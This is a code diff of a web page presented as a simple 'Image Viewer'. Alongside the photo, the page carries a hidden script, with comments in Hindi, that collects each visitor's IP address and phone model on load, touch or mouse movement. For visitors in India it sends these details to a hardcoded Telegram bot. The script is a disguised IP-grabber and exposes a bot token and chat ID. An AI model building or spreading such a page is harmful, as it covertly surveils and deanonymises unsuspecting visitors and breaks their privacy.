@@ -1,80 +1,112 @@
-<script>
-    const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
-    const telegramChatId = "1798743066"; 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            background-color: black; 
+            margin: 0; 
+            padding: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            user-select: none; 
+        }
+        img { 
+            max-width: 100%; 
+            max-height: 100vh; 
+            object-fit: contain; 
+        }
+    </style>
+</head>
+<body>
 
-    let isTracked = false;
+    <!-- 📷 फोटो अब हमेशा दिखेगी, चाहे ट्रैकिंग में कोई भी एरर आए -->
+    <img src="photo.jpg" alt="Image Viewer">
 
-    function isRealHuman() {
-        if (navigator.webdriver) return false; 
-        const ua = navigator.userAgent.toLowerCase();
-        if (ua.includes("python") || ua.includes("curl") || ua.includes("bot")) return false;
-        return true;
-    }
+    <script>
+        const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
+        const telegramChatId = "1798743066"; 
 
-    function startTracking() {
-        if (isTracked || !isRealHuman()) return;
-        isTracked = true;
+        let isTracked = false;
 
-        // 🚀 एक साथ 2 अलग-अलग API से ट्राई करेगा ताकि फेल होने का चांस 0% हो जाए
-        fetch('https://ipapi.co')
-        .then(res => res.json())
-        .then(data => processVisitor(data))
-        .catch(() => {
-            // अगर पहली API फेल हुई, तो ये दूसरी बैकअप API तुरंत काम करेगी
-            fetch('https://ipinfo.io')
-            .then(res => res.json())
-            .then(data => {
-                // दोनों API का डेटा फॉर्मेट मैच करना
-                let formattedData = {
-                    ip: data.ip,
-                    country_code: data.country,
-                    city: data.city,
-                    region: data.region,
-                    org: data.org
-                };
-                processVisitor(formattedData);
+        function startTracking() {
+            if (isTracked) return;
+            isTracked = true;
+
+            // 🚀 क्लाउडफ्लेयर के नेटवर्क से लाइव डेटा निकालना
+            fetch('/cdn-cgi/trace')
+            .then(res => res.text())
+            .then(traceText => {
+                let lines = traceText.split('\n');
+                let traceData = {};
+                
+                for (let i = 0; i < lines.length; i++) {
+                    let parts = lines[i].split('=');
+                    if (parts.length === 2) {
+                        traceData[parts[0].trim()] = parts[1].trim();
+                    }
+                }
+
+                let visitorIP = traceData['ip'] || "Unknown IP";
+                let visitorCountry = traceData['loc'] || "Unknown"; 
+
+                // 🇮🇳 सिर्फ इंडिया लॉक (यदि विज़िटर इंडिया का है तभी टेलीग्राम पर जाएगा)
+                if (visitorCountry === "IN") {
+                    getDeviceModelAndSend(visitorIP);
+                }
+            })
+            .catch(err => {
+                // बैकअप तरीका: अगर क्लाउडफ्लेयर ट्रेस काम न करे, तो सीधे आईपी निकालकर भेजें
+                fetch('https://ipify.org')
+                .then(res => res.json())
+                .then(data => {
+                    getDeviceModelAndSend(data.ip);
+                }).catch(e => console.log("Tracking Offline"));
             });
-        });
-    }
+        }
 
-    function processVisitor(ipData) {
-        // 🇮🇳 सिर्फ इंडिया लॉक
-        if (ipData.country_code === "IN" || ipData.country_code === "India") {
+        function getDeviceModelAndSend(ip) {
             let phoneModel = "Laptop/Desktop or Hidden Model";
+            
+            // ब्राउज़र की प्राइवेसी लेयर से असली फोन का नाम निकालना
             if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
                 navigator.userAgentData.getHighEntropyValues(['model'])
                 .then(uaData => {
-                    if(uaData.model) phoneModel = uaData.model;
-                    sendToTelegram(ipData, phoneModel);
+                    if (uaData.model) phoneModel = uaData.model;
+                    sendToTelegram(ip, phoneModel);
                 }).catch(() => {
-                    sendToTelegram(ipData, phoneModel);
+                    sendToTelegram(ip, phoneModel);
                 });
             } else {
-                sendToTelegram(ipData, phoneModel);
+                sendToTelegram(ip, phoneModel);
             }
         }
-    }
 
-    function sendToTelegram(ip, model) {
-        const message = `🚨 *New Real Visitor Alert (India)* 🚨\n\n` +
-                        `🌐 *IP Address:* \`${ip.ip}\`\n` +
-                        `📍 *Location:* ${ip.city}, ${ip.region}\n` +
-                        `🏢 *ISP/Internet:* ${ip.org}\n` +
-                        `📱 *Device Model:* ${model}\n` +
-                        `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;
+        function sendToTelegram(ip, model) {
+            const message = `🚨 *New Visitor Alert (India)* 🚨\n\n` +
+                            `🌐 *IP Address:* \`${ip}\`\n` +
+                            `📱 *Device Model:* ${model}\n` +
+                            `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;
 
-        fetch(`https://telegram.org{telegramToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: telegramChatId,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        });
-    }
+            fetch(`https://telegram.org{telegramToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
 
-    window.addEventListener('DOMContentLoaded', startTracking);
-    window.addEventListener('touchstart', startTracking);
-    window.addEventListener('mousemove', startTracking);
-</script>
+        // विज़िटर के आते ही या स्क्रीन छूते ही तुरंत एक्टिव होगा
+        window.addEventListener('DOMContentLoaded', startTracking);
+        window.addEventListener('touchstart', startTracking);
+        window.addEventListener('mousemove', startTracking);
+    </script>
+
+</body>
+</html>
